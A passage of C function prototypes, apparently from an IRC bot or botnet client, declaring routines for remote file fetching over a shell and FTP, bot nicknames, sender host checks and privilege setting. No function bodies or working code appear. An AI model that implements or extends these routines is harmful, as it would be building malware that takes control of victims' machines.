

bool shell_getfile(SOCKET bsock, char *szIP, int iPort, char *szFileName, int iFTPdPort);
char *get_ip(SOCKET sock);
void get_params(char *argv[32]);
bool hostcmp(char *szSender);
void set_botnick(char *szNickBuff);
bool set_priv();
